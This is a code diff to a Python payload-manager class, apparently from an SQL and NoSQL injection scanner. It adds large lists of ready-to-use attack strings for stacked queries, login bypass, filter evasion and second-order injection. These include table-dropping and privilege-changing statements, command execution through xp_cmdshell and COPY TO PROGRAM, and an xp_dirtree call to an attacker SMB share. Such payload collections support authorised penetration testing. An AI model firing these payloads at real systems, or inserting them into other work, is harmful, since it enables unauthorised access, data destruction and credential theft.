@@ -406,13 +406,215 @@ class PayloadManager:
                 "{\"$where\": \"function() { return JSON.stringify(this).indexOf('admin') > -1; }\"}"
             ],
 
-            # NoSQL Injection Payloads (Placeholder for future feature)
+            # NoSQL Injection Payloads
             "nosql": [
                 "{\"$where\": \"true\"}",
                 "{\"$where\": \"sleep(5000)\"}",
                 "{\"$gt\": \"\"}",
                 "[$ne]",
-                "|| 1==1"
+                "|| 1==1",
+                # Batch 2 — Expanded NoSQL
+                "{\"$ne\": \"\"}",
+                "{\"$ne\": null}",
+                "{\"$gt\": -1}",
+                "{\"$gte\": 0}",
+                "{\"$lt\": 99999999}",
+                "{\"$exists\": true}",
+                "{\"$regex\": \".*\"}",
+                "{\"$regex\": \"^a\"}",
+                "{\"$regex\": \"^admin\"}",
+                "{\"$in\": [\"\", \"admin\", \"root\"]}",
+                "{\"$nin\": [\"nonexistent\"]}",
+                "{\"$or\": [{}, {\"admin\": true}]}",
+                "{\"$where\": \"return true\"}",
+                "{\"$where\": \"this.password.length > 0\"}",
+                "{\"$where\": \"Object.keys(this).length > 0\"}",
+                "true, $where: '1 == 1'",
+                "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+                "{\"$where\": \"function(){return true;}\"}",
+                "{\"$where\": \"function(){return this.username=='admin';}\"}",
+                "{\"$comment\": \"'; return true; var x='\"}",
+                # MongoDB operator injection
+                "username[$ne]=admin&password[$ne]=admin",
+                "username[$regex]=.*&password[$regex]=.*",
+                "username[$gt]=&password[$gt]=",
+                "username[$exists]=true&password[$exists]=true",
+                # CouchDB
+                "{\"selector\":{\"_id\":{\"$gt\":null}}}",
+            ],
+
+            # ═══════════════════════════════════════════════════
+            # NEW CATEGORIES (Batch 2)
+            # ═══════════════════════════════════════════════════
+
+            # Stacked Queries — execute multiple statements
+            "stacked": [
+                "'; SELECT 1;--",
+                "\"; SELECT 1;--",
+                "'; DROP TABLE test;--",
+                "'; SELECT @@version;--",
+                "'; SELECT user();--",
+                "'; SELECT database();--",
+                "'; EXEC xp_cmdshell('whoami');--",
+                "'; EXEC sp_configure 'show advanced options',1;--",
+                "'; DECLARE @x VARCHAR(100); SET @x='test';--",
+                "'; BEGIN DECLARE @x INT; SET @x=1; END;--",
+                # MySQL stacked
+                "'; SELECT SLEEP(3);--",
+                "'; SELECT BENCHMARK(1000000,SHA1('test'));--",
+                "'; INSERT INTO test VALUES(1);--",
+                "'; UPDATE users SET role='admin' WHERE 1=1;--",
+                # PostgreSQL stacked
+                "'; SELECT pg_sleep(3);--",
+                "'; CREATE TABLE test(id INT);--",
+                "'; COPY (SELECT '') TO PROGRAM 'whoami';--",
+                # MSSQL stacked
+                "'; WAITFOR DELAY '0:0:3';--",
+                "'; SELECT name FROM master..sysdatabases;--",
+                "'; EXEC master..xp_dirtree '\\\\attacker\\share';--",
+            ],
+
+            # Authentication Bypass payloads
+            "auth_bypass": [
+                "admin'--",
+                "admin' #",
+                "admin'/*",
+                "' OR 1=1--",
+                "' OR 1=1#",
+                "' OR 1=1/*",
+                "') OR ('1'='1--",
+                "') OR ('1'='1#",
+                "') OR ('1'='1/*",
+                "' OR '1'='1'--",
+                "' OR '1'='1'#",
+                "' OR '1'='1'/*",
+                "' OR 1=1 LIMIT 1--",
+                "' OR 1=1 LIMIT 1#",
+                "admin' OR '1'='1",
+                "admin' OR '1'='1'--",
+                "admin' OR '1'='1'#",
+                "admin') OR ('1'='1'--",
+                "' UNION SELECT 1,'admin','password'--",
+                "' UNION SELECT 1,'admin','21232f297a57a5a743894a0e4a801fc3'--",
+                "admin'--",
+                "' OR ''='",
+                "' OR 'x'='x",
+                "' OR 1 -- -",
+                "' OR 1=1 OR ''='",
+                "') OR ('a'='a",
+                "' OR 'one'='one",
+                "' OR 'one'='one'--",
+                "1' ORDER BY 1--",
+                "1' ORDER BY 2--",
+                "1' ORDER BY 3--",
+                "1' ORDER BY 10--",
+                "1' ORDER BY 100--",
+                "' GROUP BY 1--",
+                "' HAVING 1=1--",
+                "' HAVING 1=1#",
+                "admin' AND 1=1--",
+                "admin' AND 1=0--",
+                "' OR username LIKE '%admin%'--",
+                "' OR role='admin'--",
+            ],
+
+            # Filter Evasion — encoded and obfuscated payloads
+            "filter_evasion": [
+                # Case variations
+                "' oR 1=1--",
+                "' Or 1=1--",
+                "' OR 1=1--",
+                "' UnIoN SeLeCt 1,2,3--",
+                "' uNiOn sElEcT 1,2,3--",
+                # Comment insertion
+                "' UN/**/ION SEL/**/ECT 1,2,3--",
+                "' UNI/**/ON SEL/**/ECT 1,2,3--",
+                "' UNIO/**/N SELE/**/CT 1,2,3--",
+                "' U/**/NION S/**/ELECT 1,2,3--",
+                # Whitespace alternatives
+                "' OR\t1=1--",
+                "' OR\n1=1--",
+                "' OR\r\n1=1--",
+                "' UNION\tSELECT\t1,2,3--",
+                "' UNION\nSELECT\n1,2,3--",
+                # URL encoding
+                "%27%20OR%201=1--",
+                "%27%20UNION%20SELECT%201,2,3--",
+                "%27%20AND%201=1--",
+                # Double URL encoding
+                "%2527%2520OR%25201=1--",
+                "%2527%2520UNION%2520SELECT%25201,2,3--",
+                # Hex encoding
+                "' OR 0x313d31--",
+                "' UNION SELECT 0x61646d696e--",
+                # Unicode
+                "' OR ＇1＇=＇1--",
+                "＇ OR 1=1--",
+                # Null bytes
+                "%00' OR 1=1--",
+                "' OR 1=1--%00",
+                "'%00 OR 1=1--",
+                # Parentheses tricks
+                "' OR (1)=(1)--",
+                "' OR ((1))=((1))--",
+                "' OR (((1)))=(((1)))--",
+                # Mathematical equivalents
+                "' OR 2-1=1--",
+                "' OR 3-2=1--",
+                "' OR 10-9=1--",
+                "' OR 0+1=1--",
+                "' OR 1*1=1--",
+                "' OR 1/1=1--",
+                "' OR 1 DIV 1=1--",
+                "' OR 1 MOD 1=0--",
+                # String concatenation tricks
+                "' OR 'a'||'b'='ab'--",
+                "' OR CONCAT('a','b')='ab'--",
+                "' OR 'a'+'b'='ab'--",
+                # Using functions
+                "' OR LENGTH('a')=1--",
+                "' OR ASCII('a')=97--",
+                "' OR CHAR(97)='a'--",
+                "' OR SUBSTR('abc',1,1)='a'--",
+                "' OR SUBSTRING('abc',1,1)='a'--",
+                "' OR LEFT('abc',1)='a'--",
+                "' OR RIGHT('abc',1)='c'--",
+                "' OR REVERSE('a')='a'--",
+                "' OR UPPER('a')='A'--",
+                "' OR LOWER('A')='a'--",
+                "' OR TRIM(' a ')='a'--",
+                "' OR LTRIM(' a')='a'--",
+                "' OR REPLACE('abc','a','a')='abc'--",
+            ],
+
+            # Second-Order SQLi preparation payloads
+            "second_order": [
+                # Stored payloads that trigger on retrieval
+                "admin'--",
+                "admin' OR '1'='1",
+                "admin' UNION SELECT 1,2,3--",
+                "admin'; DROP TABLE users;--",
+                "admin'; INSERT INTO users VALUES('hacked','hacked');--",
+                "admin' AND 1=CONVERT(int,(SELECT @@version))--",
+                "admin' AND 1=CONVERT(int,(SELECT user()))--",
+                "admin' AND 1=CONVERT(int,(SELECT database()))--",
+                # Registration-based
+                "test' OR '1'='1",
+                "test'; SELECT 1;--",
+                "test' UNION SELECT password FROM users WHERE '1'='1",
+                # Profile update based
+                "O'Reilly' OR '1'='1",
+                "O'Reilly'; DROP TABLE users;--",
+                # Email-based
+                "test@test.com' OR '1'='1",
+                "test@test.com'; SELECT 1;--",
+                # Filename-based
+                "file.jpg'; SELECT 1;--.jpg",
+                "file.jpg' UNION SELECT 1;--.jpg",
+                # Comment/feedback based
+                "Great product!' OR '1'='1",
+                "Nice!' UNION SELECT password FROM users--",
+                "Review'; INSERT INTO admin VALUES('h','h');--",
             ]
         }
 
@@ -443,3 +645,18 @@ class PayloadManager:
         
         # Return generic payloads if available, otherwise empty list
         return payloads.get("generic", [])
+
+    def get_all_categories(self):
+        """Return list of all payload category names"""
+        return list(self.payloads.keys())
+
+    def get_payload_count(self):
+        """Return total count of all payloads across all categories"""
+        total = 0
+        for key, value in self.payloads.items():
+            if isinstance(value, dict):
+                for db_payloads in value.values():
+                    total += len(db_payloads)
+            elif isinstance(value, list):
+                total += len(value)
+        return total
